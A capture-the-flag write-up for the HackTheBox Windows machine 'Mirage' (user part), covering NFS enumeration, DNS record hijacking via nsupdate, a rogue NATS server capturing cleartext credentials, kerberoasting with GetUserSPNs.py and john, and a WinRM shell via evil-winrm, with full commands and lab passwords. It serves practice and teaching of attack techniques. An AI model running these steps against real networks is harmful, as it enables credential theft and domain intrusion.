---
title: HackTheBox - Mirage writeup (Windows/Hard) - user part
categories: [HackTheBox]
tags: [HackTheBox, Mirage, windows, nmap, AD, nfs, smb, nxc, NTLM, disabled-NTLM-auth, kerberos, krb5.conf, ntp, timedatectl, ntpdate, showmount, nfs-vers-3, nfs-vers-4, dns, dns-hijack, nats, nats-servre, nc, dns-nonsecure-update, ntlm-audit, nsupdate, wireshark, traffic-analysis, follow-tcp-stream, nats-stream, bloodhound, bloodhound-python, GetUserSPNs.py, TGS-REP, kerberoasting, john, REMOTE MANAGEMENT GROUP, TGT, winrm, evil-winrm, winpeas, bloodhound-custom-query, sharphound, ADCS]
render_with_liquid: false
---

`mirage` is hard windows machine where I only could get the user flag before it retired, for the foothold I hijacked an internally used dns entry and got initial user creds by tricking a user to connect to my nats server instead of the legitimate one and capturing their credentials, I used the password to explore the original nats server and found new credentials there, then used the newly obtained creds to get the hash of a kerberoastable user, crack his hash and get the user flag, even tho this is as far I got on the box, at the end of the post I talked about some enumeration steps I've done to figure out what I needed to do at a further stage have I got another user, as well as some things I learned from this box write ups
## Initial recon
### AD recon

I ran `nmap` on the host and got a typical windows domain controller output with the domain being `mirage.htb`, hostname is `dc01`, few other ports were open as well
```bash
# Nmap 7.97 scan initiated Mon Oct  6 16:32:57 2025 as: nmap -sSVC -vv -oA mirage 10.10.11.78
Nmap scan report for 10.10.11.78
Host is up, received reset ttl 127 (0.20s latency).
Scanned at 2025-10-06 16:33:00 +01 for 115s
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-06 22:33:16Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:     da96 ee88 7537 0dcf 1bd4 4aa3 2104 5393
| SHA-1:   c25a 58cc 950f ce6e 64c7 cd40 e98e bb5a 653f b9ff
| SHA-256: e6fd f3f7 7d3a 2d76 c996 6372 f06b 94da ce1a a9cc d62d 8178 5c08 9bf9 ba4b 9dd6
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:     da96 ee88 7537 0dcf 1bd4 4aa3 2104 5393
| SHA-1:   c25a 58cc 950f ce6e 64c7 cd40 e98e bb5a 653f b9ff
| SHA-256: e6fd f3f7 7d3a 2d76 c996 6372 f06b 94da ce1a a9cc d62d 8178 5c08 9bf9 ba4b 9dd6
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:     da96 ee88 7537 0dcf 1bd4 4aa3 2104 5393
| SHA-1:   c25a 58cc 950f ce6e 64c7 cd40 e98e bb5a 653f b9ff
| SHA-256: e6fd f3f7 7d3a 2d76 c996 6372 f06b 94da ce1a a9cc d62d 8178 5c08 9bf9 ba4b 9dd6
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:     da96 ee88 7537 0dcf 1bd4 4aa3 2104 5393
| SHA-1:   c25a 58cc 950f ce6e 64c7 cd40 e98e bb5a 653f b9ff
| SHA-256: e6fd f3f7 7d3a 2d76 c996 6372 f06b 94da ce1a a9cc d62d 8178 5c08 9bf9 ba4b 9dd6
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38031/tcp): CLEAN (Couldn''t connect)
|   Check 2 (port 26242/tcp): CLEAN (Couldn''t connect)
|   Check 3 (port 62882/udp): CLEAN (Failed to receive data)
|   Check 4 (port 45417/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2025-10-06T22:34:13
|_  start_date: N/A
|_clock-skew: 6h59m59s
```

I noticed that `nfs` was running which is an unusual service to be running on windows (windows has `smb` for me instead), let alone a domain controller, I'll hold this for a sec and go get some info about the domain using `nxc`

I used `nxc` to generate the hosts file for me
```bash
$ nxc smb 10.10.11.78 --generate-hosts-file hosts
SMB         10.10.11.78     445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
```

which add the following entry
```bash
10.10.11.78     dc01.mirage.htb mirage.htb dc01
```

other than the information I already knew (domain and hostname) the output mentions that `ntlm` was disabled (`(NTLM:False)`), so I have to generate a `kerberos` configuration file in order for my machine to be able to talk with the domain
```bash
$ nxc smb 10.10.11.78 --generate-krb5-file krb
SMB         10.10.11.78     445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.78     445    dc01             [+] krb5 conf saved to: krb
SMB         10.10.11.78     445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=krb
```

and copied the file to `/etc/krb5.conf` so all subsequent tools use it
```bash
$ sudo cp krb /etc/krb5.conf
```

I also disabled `ntp` automatic time sync on my machine, and sync'd my time with the box since I'm going to interacting with `kerberos` at some time
```bash
$ sudo timedatectl set-ntp false
$ sudo ntpdate mirage.htb
```

### Nfs recon
back to the `nfs` port, I used `showmount` to check if there any exported shares I can mount
```bash
$ showmount -e mirage.htb
Export list for mirage.htb:
/MirageReports (everyone)
```

I mounted `/MirageReports` into my `/tmp/mount` with `nfs` version 3 for less strict mounting `ACL`s, inside I found 2 pdf reports
```bash
$ mkdir /tmp/mount
$ sudo mount -t nfs -o vers=3 mirage.htb:/MirageReports /tmp/mount/
$ ls /tmp/mount
Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf
```

the file permissions were a bit tricky with `nfs`, basically the files were owned by `uid` 4294967294 (or by the user `nobody` if `-o vers=3` were omitted), and I was unable to open those pdfs while they were inside that mounted share, so I had to go into the directory, copy them to somewhere with `sudo`, then changing their ownership with `chown` to my regular user in order to open them
```bash
$ ls -lh /tmp/mount/
total 18M
-rwx------ 1 4294967294 4294967294 8.2M May 20  2025 Incident_Report_Missing_DNS_Record_nats-svc.pdf
-rwx------ 1 4294967294 4294967294 9.0M May 26 22:37 Mirage_Authentication_Hardening_Report.pdf
```

after doing this bit, I found out that `nxc` supports `nfs` and the whole process can be made easier with `nxc nfs --enum-shares` and `nxc nfs --share $SHARE --get-file $FILE`

### missing dns record report
`Incident_Report_Missing_DNS_Record_nats-svc.pdf` this pdf is report about missing `nats-svc.mirage.htb` `dns` record
![missing_dns_record.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/missing_dns_record.png)

it also shows that port 4222 is open on the machine but trying to connect to it using `nats-svc.mirage.htb` `dns` fails
![port_4222_open.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/port_4222_open.png)

this port didn't show up in the initial `nmap` result, probably because it's not a part of the top 10000 ports that it scans (definitely a lesson to run full ports scans in the future), but using `nc` I can check that the port is open
```bash
$ nc -vz mirage.htb 4222
mirage.htb [10.10.11.78] 4222 open
```

the pdf also shows that the `dns` is configured to allow both `nonsecure` and `secure` dynamic dns updates which allows any user to update `dns` entries

![nonsecure_dns_updated_allowed.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/nonsecure_dns_updated_allowed.png)

it also states that this can be abused if the said `dns` entry would be hijacked by an attacker
![dns_security_considerations.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/dns_security_considerations.png)
### Authentication Hardening Report
this report highlights the plans of disabling `NTLM` authentication in favor of `kerberos` auth

![disabling_ntlm_auth_summary.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/disabling_ntlm_auth_summary.png)

it also shows the timelines of the the said plans
![NTLM_auth_plans_timeline.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/NTLM_auth_plans_timeline.png)

and the current status in that timeline, which shows that NTLM authentication is still not fully disabled yet
![current_NTLM_plans_status.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/current_NTLM_plans_status.png)

the footer of the report shows a potential user in the domain
![potential_user.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/potential_user.png)

### Nats recon
since I found that port `4222` was open, I tried to connect to it and list existing streams, but failed due to not having any user credentials
```bash
$ nats --server 10.10.11.78:4222 stream list
nats: error: setup failed: nats: Authorization Violation
```
### Dns recon
as expected trying to to query `nats-svc.mirage.htb` from the domain controller doesn't yield any results
``` bash
$ dig nats-svc.mirage.htb @mirage.htb +short
```

since the `dns` server allows nonsecure dynamic updates I tried sending a request to make that entry points to my IP and it worked
```bash
$ nsupdate
> server dc01.mirage.htb
> zone mirage.htb
> update add nats-svc.mirage.htb 36000 A 10.10.15.93
> send
```

now when I try to query `nats-svc.mirage.htb` again, it points to my IP now
```bash
$ dig nats-svc.mirage.htb @mirage.htb +short
10.10.15.93
```
## user.txt
### Dev_Account_A nats credentials
monitoring the traffic in `wireshark` after I update the dns entry I get the following
![wireshark_traffic_monitoring.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/wireshark_traffic_monitoring.png)

first 2 packets is me sending the `dns` update, second 2 is me querying the the entry using `nsupdate` and the machine resolving it to my IP, then after about 10 seconds it tries to repeatedly connect to `4222` on my machine and fails because I don't have any nats servers running

#### Running a nats server to capture user credentials

I installed a nats server with my package manager and ran it in verbose mode so I can see the traffic going through it
```bash
$ sudo nats-server --net 10.10.15.93 -V
[9106] 2025/11/23 16:43:00.734395 [INF] Starting nats-server
[9106] 2025/11/23 16:43:00.734432 [INF]   Version:  2.12.1
[9106] 2025/11/23 16:43:00.734438 [INF]   Git:      [fab5f99]
[9106] 2025/11/23 16:43:00.734444 [INF]   Name:     NDSLEHMZVHM7JCY6R7DAS4XZPTTLL6OMOLSTOBZHR7PRPEA2O2DL4HNC
[9106] 2025/11/23 16:43:00.734449 [INF]   ID:       NDSLEHMZVHM7JCY6R7DAS4XZPTTLL6OMOLSTOBZHR7PRPEA2O2DL4HNC
[9106] 2025/11/23 16:43:00.734898 [INF] Listening for client connections on 10.10.15.93:4222
[9106] 2025/11/23 16:43:00.734912 [INF] Server is ready
[9106] 2025/11/23 16:43:22.191066 [TRC] 10.10.11.78:59523 - cid:5 - <<- [CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"[REDACTED]","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":true,"no_responders":true}]
```

I got the username `Dev_Account_A` but the password was redacted, this is safety measure by the `nats` server so password don't end up leaked

because the connection wasn't encrypted, I captured the traffic using `wireshark`
![wireshark_nats_auth_traffic.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/wireshark_nats_auth_traffic.png)

and by following the `tcp stream` on the first packet I got the clear-text password
![wireshark_tcp_stream.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/wireshark_tcp_stream.png)

### david.jjackson
#### Exploring the original nats server on the domain controller
since we now have `nats` credentials for the `Dev_account_A` user, I used to to explore the original nats server, and found an `auth_logs` stream 

```bash
$ nats --server 10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' stream list
╭─────────────────────────────────────────────────────────────────────────────────╮
│                                     Streams                                     │
├───────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message │
├───────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
│ auth_logs │             │ 2025-05-05 08:18:19 │ 5        │ 570 B │ 200d12h49m0s │
╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯
```

inside the stream I found credentials for `DAVID.JJACKSON`

```bash
$ nats --server 10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' stream view auth_logs
[1] Subject: logs.auth Received: 2025-05-05 08:18:56
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[2] Subject: logs.auth Received: 2025-05-05 08:19:24
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[3] Subject: logs.auth Received: 2025-05-05 08:19:25
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[4] Subject: logs.auth Received: 2025-05-05 08:19:26
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[5] Subject: logs.auth Received: 2025-05-05 08:19:27
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


16:52:47 Reached apparent end of data
```

the credentials worked for `ldap` auth over `kerberos`
```bash
$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

## nathan.aadam
### bloodhound
I got a `TGT` for `david.jjackson` and used it with `bloodhound-python` ingestor
```bash
$ getTGT.py mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'
[*] Saving ticket in david.jjackson.ccache
```

```bash
$ KRB5CCNAME=david.jjackson.ccache bloodhound-python -k -no-pass -dc dc01.mirage.htb -ns 10.10.11.78 -c all -d mirage.htb -u david.jjackson --zip
```

I loaded the data in bloodhound, but `david.jjackson` had no outbound

further playing with `bloodhound` builtin cipher queries showed that `nathan.aadam` is kerberoastable


I used `GetUserSPNs.py` to retrieve `TGS-REP` hash
```bash
$ KRB5CCNAME=david.jjackson.ccache GetUserSPNs.py -outputfile nathan.tgs -k -no-pass -dc-ip 10.10.11.78 mirage.htb/david.jjackson: -dc-host dc01.mirage.htb
ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 22:18:18.584667  2025-11-23 19:13:21.452396
```

then crack the hash with `john`
```bash
$ john nathan.tgs --wordlist=$ROCK
Warning: detected hash type "krb5tgs", but the string is also recognized as "krb5tgs-opencl"
Use the "--format=krb5tgs-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
3edc#EDC3        (?)
1g 0:00:00:04 DONE (2025-11-24 04:12) 0.2342g/s 2920Kp/s 2920Kc/s 2920KC/s 3er5ty7..3busyboys
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
$ nxc ldap mirage.htb -u nathan.aadam -p '3edc#EDC3' -k
LDAP        mirage.htb      389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        mirage.htb      389    DC01             [+] mirage.htb\nathan.aadam:3edc#EDC3
```

`nathan.aadam` didn't have any interesting outbound control but he was is a member of the `REMOTE MANAGEMENT GROUP` among other groups
![nathan_groups.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/nathan_groups.png)

so I grabbed his `TGT` and used it to get a `winrm` shell and get the flag user
```bash
$ getTGT.py mirage.htb/nathan.aadam:'3edc#EDC3'
[*] Saving ticket in nathan.aadam.ccache
```

```bash
$ KRB5CCNAME=nathan.aadam.ccache evil-winrm -i dc01.mirage.htb -r mirage.htb

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> type ../Desktop/user.txt
45****************************2f
```

this is as far I got in the box, I did conduct further enumeration and got a few ideas what can be done at a later stage, but that was it for me before the box retired

## further enumeration
### Winpeas
I ran winpeas and it detected some autoLogin credentials but the box retired before I could figure out how to extract them

![mark_bbond_autologin_creds.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/mark_bbond_autologin_creds.png)

it also showed that full domain-wide NTLM disablement is still not implemented as per the first PDF we found

![NTLM_auditing.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/NTLM_auditing.png)
### Bloodhound
I ran the following query to get all unique relationship between edges
```cypher
MATCH p=(source)-[r]->(target)
WHERE (source:Computer or source:User)
AND type(r) <> 'MemberOf'
return p
``` 

and found the following that `javier.mmarshall` has `ReadGMSAPassword` `MIRAGE-SERVICE$` machine account but I couldn't do anything about with my current user xd
![further_queries.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/further_queries.png)

### Sharphound
once I got a `winrm` shell as `nathan.aadam` and that gave me more information about the domain, specifically the `ADCS` part, I could see that the first 2 users I pwned had the permissions to enroll to some few certificate templates
#### david.jjackson
![david_jjackson_extended_outbound_control.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/david_jjackson_extended_outbound_control.png)

#### nathan.aadam
![natahn_adam_extended_oubound_control.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/mirage/natahn_adam_extended_oubound_control.png)

### Certipy
since `ADCS` was running on the box I used `certipy` to look for potential vulnerable certificates, but I found none with the 2 users I had

## conclusion

even tho I didn't finish this box in time, it was a such good and fun box, and I learned a lot, even more from the ippsec/0xdf writeups, specifically about the cross session relay attack and how to exploit it in windows servers up to windows-2016, how the patch works in later versions, and how it can be bypassed to make the attack feasible in patched environments 
